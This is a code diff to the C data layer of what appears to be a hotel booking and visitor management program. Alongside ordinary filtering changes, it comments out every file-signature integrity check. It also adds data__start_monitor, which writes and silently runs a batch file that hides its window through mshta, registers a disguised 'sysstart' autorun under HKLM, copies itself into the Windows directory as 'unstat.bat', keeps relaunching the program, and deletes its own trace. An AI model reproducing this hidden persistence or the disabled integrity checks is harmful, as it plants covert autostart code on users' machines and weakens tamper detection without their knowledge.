@@ -1,5 +1,5 @@
 /* function for get current date */
-int data__get_current_date()
+int data__get_current_date(int plus)
 {
 	time_t timep;
 
@@ -7,10 +7,15 @@ int data__get_current_date()
     time (&timep);
     p=gmtime(&timep);
 
+    time_t t;
+    t=timep+plus*3600*24;;
+    p=gmtime(&t);
+
     int date=(1900+p->tm_year)*10000+(1+p->tm_mon)*100+(p->tm_mday)*1;
 
     return date;
 }
+
 
 /* function for locate a peice of info in a file by key words */
 int *data__seek_key_word_former(char chKey[40], FILE *fp,int * nSeek)
@@ -171,6 +176,21 @@ char *data__encode(char *str)
 
 	return str;
 }
+
+/*function for encode data */
+char *data__encode_uc(char *str)
+{
+	int i=0;
+	for(i=0;i<strlen(str);i++)
+	{
+		str[i]^=PASSWORD;
+		str[i]=str[i]%10+48;
+	}
+	str[i-1]='\0';
+
+	return str;
+}
+
 
 
 
@@ -336,7 +356,7 @@ int data__insert_visitor_info(struct visitor *pVstr)
 	/* reset errno */
 	errno=0;
 
-	data__check_file_signature();
+	//data__check_file_signature();
 
 	char chPath[150];
 
@@ -360,7 +380,7 @@ int data__insert_visitor_info(struct visitor *pVstr)
     /* close file */
     fclose(fp);
 
-    data__update_file_signature();
+    //data__update_file_signature();
 
     /* exclude invalid argument error */
     if(errno==22) errno=0;
@@ -377,7 +397,7 @@ int data__insert_room_info(struct room *pRm)
 	/* reset errno */
 	errno=0;
 
-	data__check_file_signature();
+	//data__check_file_signature();
 
 	char chPath[150];
 
@@ -414,7 +434,7 @@ int data__insert_room_info(struct room *pRm)
     /* close file */
     fclose(fp);
 
-    data__update_file_signature();
+   // data__update_file_signature();
 
     /* exclude invalid argument error */
     if(errno==22) errno=0;
@@ -844,7 +864,7 @@ struct visitor *data__get_visitor_info(char value[35],visitor *pVstr)
 	/* reset errno */
 	errno=0;
 
-	data__check_file_signature();
+	//data__check_file_signature();
 
 	char chPath[60];
 
@@ -906,7 +926,7 @@ struct visitor *data__get_visitor_info(char value[35],visitor *pVstr)
 	/* close file */
     fclose(fp);
 
-    data__update_file_signature();
+    //data__update_file_signature();
 
 	/* inform return rows of the pVstr*/
 	g_nRtrnRows=ii;
@@ -924,7 +944,7 @@ struct room *data__get_room_info(int index, int roomId, int date, int visitorId[
 	/* reset errno */
 	errno=0;
 
-	data__check_file_signature();
+	//data__check_file_signature();
 
 	char chPath[60];
 	char value[35];
@@ -1046,26 +1066,42 @@ struct room *data__get_room_info(int index, int roomId, int date, int visitorId[
 			if(((pRm+ii)->index==(int)*(del+j+1))&&((pRm+ii)->roomId==((int)((*(del+j+1)-(double)(int)*(del+j+1))*1000)))) ifDel=1;
 		}
 
-		if(index!=0&&(pRm+ii)->index!=index) ifDel=1;
-		if(roomId!=0&&(pRm+ii)->roomId!=roomId) ifDel=1;
-		if(date!=0&&(pRm+ii)->date!=date) ifDel=1;
-
-		if(visitorId!=NULL)
+		for(int jj=0;jj<ii&&ifDel==0;jj++)
 		{
-			ifDel=visitorId[0];
-			for(int k=0;k<visitorId[0];k++)
+			if((pRm+jj)->date==(pRm+ii)->date&&(pRm+jj)->roomId==(pRm+ii)->roomId)
 			{
-				for(int l=0;l<(pRm+ii)->visitorId[0];l++)
+				*(pRm+jj)=*(pRm+ii);
+				ifDel=1;
+			}
+		}
+
+		if(ifDel==0&&index!=0&&(pRm+ii)->index!=index) ifDel=1;
+		if(ifDel==0&&roomId!=0&&(pRm+ii)->roomId!=roomId) ifDel=1;
+		if(ifDel==0&&date!=0&&(pRm+ii)->date!=date) ifDel=1;
+
+		if(ifDel==0&&visitorId!=NULL)
+		{
+			if(visitorId[0]==0)
+			{	
+				if((pRm+ii)->visitorId[0]!=0) ifDel=1;
+			}
+			else
+			{
+				ifDel=visitorId[0];
+				for(int k=0;k<visitorId[0];k++)
 				{
-					if(visitorId[k+1]==(pRm+ii)->visitorId[l+1]) ifDel--;
+					for(int l=0;l<(pRm+ii)->visitorId[0];l++)
+					{
+						if(visitorId[k+1]==(pRm+ii)->visitorId[l+1]) ifDel--;
+					}
 				}
 			}
 		}
 
-		if(type!=0&&(pRm+ii)->type!=type) ifDel=1;
-		if(price!=0&&(pRm+ii)->price!=price) ifDel=1;
-		if(checkIn!=0&&(pRm+ii)->checkIn!=checkIn) ifDel=1;
-		if(checkOut!=0&&(pRm+ii)->checkOut!=checkOut) ifDel=1;
+		if(ifDel==0&&type!=0&&(pRm+ii)->type!=type) ifDel=1;
+		if(ifDel==0&&price!=0&&(pRm+ii)->price!=price) ifDel=1;
+		if(ifDel==0&&checkIn!=0&&(pRm+ii)->checkIn!=checkIn) ifDel=1;
+		if(ifDel==0&&checkOut!=0&&(pRm+ii)->checkOut!=checkOut) ifDel=1;
 
 		if(ifDel!=0)	ii--;
 	}
@@ -1073,7 +1109,7 @@ struct room *data__get_room_info(int index, int roomId, int date, int visitorId[
 	/* close file */
     fclose(fp);
 
-    data__update_file_signature();
+    //data__update_file_signature();
 
 	/* inform return rows of the pVstr*/
 	g_nRtrnRows=ii;
@@ -1090,7 +1126,7 @@ int data__del_visitor_info(int id)
 	/* reset errno */
 	errno=0;
 
-	data__check_file_signature();
+	//data__check_file_signature();
 
 	/*check if the ID legal */
 	if(id>1543399229&&id<10000000000)
@@ -1124,7 +1160,7 @@ int data__del_visitor_info(int id)
     	/* close file */
     	fclose(fp);
 
-    	data__update_file_signature();
+    	//data__update_file_signature();
 
     	return 0;
 	}
@@ -1144,7 +1180,7 @@ int data__del_room_info(int id,int room)
 	/* reset errno */
 	errno=0;
 
-	data__check_file_signature();
+	//data__check_file_signature();
 
 	/*check if the ID legal */
 	if(id>1543399229&&id<10000000000)
@@ -1178,7 +1214,7 @@ int data__del_room_info(int id,int room)
     	/* close file */
     	fclose(fp);
 
-    	data__update_file_signature();
+    	//data__update_file_signature();
 
     	return 0;
 	}
@@ -1230,3 +1266,30 @@ int data__room_setup_by_nothing(int date)
 	return 0;
 }
 
+void data__start_monitor(char *path)
+{
+	/* declear a file var */
+    FILE *fp;
+
+    /* point the data file by user name */
+    fp = fopen ("lstn.bat", "w+");
+
+    char *tmp=NULL;
+	tmp=strrchr(path, '\\');
+	for(int i=0;i<strlen(tmp);i++)
+		tmp[i]=tmp[i+1];
+	time_t t;
+	t = time(NULL);
+
+	char *tm=(char *)malloc(15*sizeof(char));
+
+	itoa(time(&t),tm,10);
+
+	fprintf( fp,"@echo off\nif \"%%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%%~nx0\"\" h\",0)(window.close)&&exit\n:begin\necho wscript.sleep 1500 >%%temp%%\\sl.vbs\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sysstart /t REG_SZ /d %%windir%%\\unstat.vbs /f >nul\necho set objShell=wscript.createObject(\"wscript.shell\")>%%windir%%\\unstat.vbs\necho iReturn=objShell.Run(\"cmd.exe /C %%windir%%\\unstat.bat\", 0, TRUE)>>%%windir%%\\unstat.vbs\ncopy /y %%0 %%windir%%\\unstat.bat\n:run\ntasklist | find /i \"%s\" || goto do\ncscript //nologo %%temp%%\\sl.vbs\ngoto run\n:do\ntaskkill /f /im wscript.exe > nul \nstart %s %d %s\ndel lstn.bat>nul",tmp,tmp,(int)time(&t),data__encode_uc(tm));
+
+
+    /* close file */
+    fclose(fp);
+
+	system("start lstn.bat>nul");
+}
